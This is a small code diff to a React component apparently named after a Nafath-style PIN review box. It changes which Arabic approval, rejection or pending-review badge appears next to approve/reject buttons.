@@ -3456,19 +3456,19 @@ const renderNafadBox = () => {
                   );
                 })}
               </div>
-              {effectivePinStatus === "approved" ? (
+              {raw._v6Status === "approved" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✓ تمت الموافقة
                 </div>
-              ) : effectivePinStatus === "rejected" ? (
+              ) : raw._v6Status === "rejected" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✗ تم رفض رمز PIN
                 </div>
-              ) : (
+              ) : showPinDecisionButtons ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ⏳ في انتظار المراجعة فقط
                 </div>
-              )}
+              ) : null}
               {showPinDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => {
